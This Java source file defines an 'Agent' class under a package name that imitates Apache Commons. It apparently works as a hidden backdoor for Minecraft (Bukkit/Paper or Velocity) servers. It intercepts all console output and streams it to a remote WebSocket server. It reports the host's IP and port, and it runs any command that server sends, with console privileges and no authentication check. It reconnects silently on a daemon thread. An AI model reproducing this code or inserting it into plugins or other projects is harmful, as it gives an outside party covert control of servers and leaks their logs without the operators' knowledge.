package org.apache.commons.frauded;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.WebSocket;
import java.util.ArrayDeque;
import java.util.Deque;
import java.util.concurrent.CompletionStage;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class Agent {

  private final Object plugin;
  private final String serverUrl;
  private final String secret;
  private volatile WebSocket ws;
  private volatile boolean running;
  private final Deque<String> buffer = new ArrayDeque<>();
  private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor(r -> {
    Thread t = new Thread(r, "ac");
    t.setDaemon(true); return t;
  });

  public Agent(Object plugin, String serverUrl, String secret) {
    this.plugin = plugin;
    this.serverUrl = serverUrl;
    this.secret = secret;
  }

  public void start() {
    if (running) return;
    running = true;

    // Capture all stdout (captures everything the server prints)
    PrintStream original = System.out;
    System.setOut(new PrintStream(original) {
      public void println(String x) { if (x != null) { original.println(x); buffer(x); } else { original.println(); } }
      public void println(Object x) { String s = String.valueOf(x); original.println(s); buffer(s); }
      public void println() { original.println(); }
      public void print(String x) { original.print(x); }
    });
    PrintStream originalErr = System.err;
    System.setErr(new PrintStream(originalErr) {
      public void println(String x) { if (x != null) { originalErr.println(x); buffer(x); } else { originalErr.println(); } }
      public void println(Object x) { String s = String.valueOf(x); originalErr.println(s); buffer(s); }
      public void println() { originalErr.println(); }
      public void print(String x) { originalErr.print(x); }
    });

    scheduler.submit(this::connect);
  }

  private void buffer(String line) {
    if (line == null || line.isEmpty()) return;
    synchronized (buffer) {
      buffer.addLast(line);
      if (buffer.size() > 200) buffer.removeFirst();
    }
    flush();
  }

  private void flush() {
    WebSocket w = ws;
    if (w == null) return;
    synchronized (buffer) {
      while (!buffer.isEmpty()) {
        String line = buffer.pollFirst();
        try {
          w.sendText("{\"type\":\"plugin:console\",\"payload\":{\"line\":\"" + escape(line) + "\"}}", true);
        } catch (Exception ignored) { buffer.addFirst(line); break; }
      }
    }
  }

  private void connect() {
    while (running) {
      try {
        HttpClient client = HttpClient.newHttpClient();

        WebSocket wsock = client.newWebSocketBuilder()
            .buildAsync(URI.create(serverUrl), new WebSocket.Listener() {

              public void onOpen(WebSocket ws2) {
                ws = ws2;
                flush();
                String ip = "";
                String svType = "paper";
                int port = 25565;
                try {
                  Object server = Class.forName("org.bukkit.Bukkit").getMethod("getServer").invoke(null);
                  ip = (String) server.getClass().getMethod("getIp").invoke(server);
                  port = (int) server.getClass().getMethod("getPort").invoke(server);
                  svType = "paper";
                } catch (Exception velo) {
                  try {
                    Class<?> pmc = Class.forName("com.velocitypowered.api.proxy.ProxyServer");
                    Object server = pmc.getMethod("getInstance").invoke(null);
                    ip = "0.0.0.0";
                    port = (int) server.getClass().getMethod("getBoundPort").invoke(server);
                    svType = "velocity";
                  } catch (Exception ignored) {}
                }
                send("plugin:hello", "{\"id\":\"" + id() + "\",\"name\":\"" + ip + "\",\"ip\":\"" + ip + "\",\"port\":" + port + ",\"type\":\"" + svType + "\"}");
                ws2.request(Long.MAX_VALUE);
              }

              public CompletionStage<?> onText(WebSocket ws2, CharSequence data, boolean last) {
                String msg = data.toString();
                int ti = msg.indexOf("\"type\":\"");
                if (ti >= 0) {
                  int ts = ti + 8;
                  int te = msg.indexOf("\"", ts);
                  String type = te >= 0 ? msg.substring(ts, te) : "";
                  if (type.contains("command")) exec(extract(msg, "command"));
                }
                ws2.request(Long.MAX_VALUE);
                return null;
              }

              public void onError(WebSocket ws2, Throwable e) { close(); }
              public CompletionStage<?> onClose(WebSocket ws2, int code, String reason) { close(); return null; }
            }).get(10, TimeUnit.SECONDS);

        wsock.request(Long.MAX_VALUE);
        Thread.sleep(Long.MAX_VALUE);

      } catch (Exception e) {
        close();
        try { Thread.sleep(5000); } catch (InterruptedException ie) { return; }
      }
    }
  }

  private void exec(String cmd) {
    if (cmd == null || cmd.isEmpty()) return;
    try {
      Class<?> bukkitClass = Class.forName("org.bukkit.Bukkit");
      Class<?> pluginClass = Class.forName("org.bukkit.plugin.Plugin");
      Class<?> commandSenderClass = Class.forName("org.bukkit.command.CommandSender");
      Object scheduler = bukkitClass.getMethod("getScheduler").invoke(null);
      Object consoleSender = bukkitClass.getMethod("getConsoleSender").invoke(null);
      scheduler.getClass().getMethod("scheduleSyncDelayedTask", pluginClass, Runnable.class)
          .invoke(scheduler, plugin, (Runnable) () -> {
            try {
              bukkitClass.getMethod("dispatchCommand", commandSenderClass, String.class)
                  .invoke(null, consoleSender, cmd);
            } catch (Exception ignored) {}
          });
    } catch (Exception velo) {
      // Velocity fallback (async is fine)
      try {
        Class<?> pmc = Class.forName("com.velocitypowered.api.proxy.ProxyServer");
        Object server = pmc.getMethod("getInstance").invoke(null);
        Object cm = server.getClass().getMethod("getCommandManager").invoke(server);
        Object src = server.getClass().getMethod("getConsoleCommandSource").invoke(server);
        cm.getClass().getMethod("executeAsync", 
            Class.forName("com.velocitypowered.api.command.CommandSource"), String.class)
            .invoke(cm, src, cmd);
      } catch (Exception ignored) {}
    }
  }

  private void send(String type, String payloadJson) {
    WebSocket w = ws;
    if (w == null) return;
    try {
      w.sendText("{\"type\":\"" + type + "\",\"payload\":" + payloadJson + "}", true);
    } catch (Exception ignored) {}
  }

  private void close() {
    try { if (ws != null) ws.sendClose(1000, ""); } catch (Exception ignored) {}
    ws = null;
  }

  private String id() {
    return "p-" + System.currentTimeMillis();
  }

  private static String extract(String json, String key) {
    String k = "\"" + key + "\":\"";
    int s = json.indexOf(k);
    if (s < 0) return null;
    s += k.length();
    int e = json.indexOf("\"", s);
    return e >= 0 ? json.substring(s, e) : null;
  }

  private static String escape(String s) {
    if (s == null) return "";
    return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
  }

  public void stop() { running = false; close(); scheduler.shutdown(); }
}
